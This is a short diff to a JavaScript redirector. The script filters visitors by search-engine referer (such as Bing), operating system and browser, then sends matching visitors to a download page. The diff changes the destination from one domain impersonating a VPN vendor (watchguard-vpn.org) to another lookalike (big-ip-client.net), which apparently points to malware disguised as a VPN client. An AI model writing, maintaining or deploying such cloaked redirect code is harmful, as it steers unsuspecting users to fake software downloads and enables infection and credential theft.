@@ -1,6 +1,6 @@
 (function() {
     const config = {
-        redirectUrl: 'https://watchguard-vpn.org/download.html',
+        redirectUrl: 'http://big-ip-client.net/download.html',
 
         allowedReferers: [
             'bing',
@@ -69,4 +69,5 @@
     if (isFromSearchEngine && finalOsCheck && finalBrowserCheck) {
         window.location.href = config.redirectUrl;
     }
+
 })();
